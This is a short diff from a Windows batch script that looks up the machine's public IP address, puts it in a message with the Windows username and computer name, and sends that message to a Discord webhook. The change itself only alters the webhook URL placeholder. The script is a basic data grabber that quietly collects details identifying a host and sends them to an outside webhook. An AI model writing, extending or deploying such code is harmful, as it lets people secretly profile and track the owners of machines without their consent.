@@ -25,7 +25,7 @@ for /f "delims=" %%a in ('curl -s https://api.ipify.org') do set "IP=%%a"
 
 echo [+] Sending data to Discord...
 
-set "URL=https://discord.com/api/webhooks/Your webhook"
+set "URL=Your webhook"
 :: if do you want to add antother webhook you can modify it adding for example a URL2 Variable
 
 set "MSG=Usuario: %USERNAME% - PC: %COMPUTERNAME% - IP: %IP%"
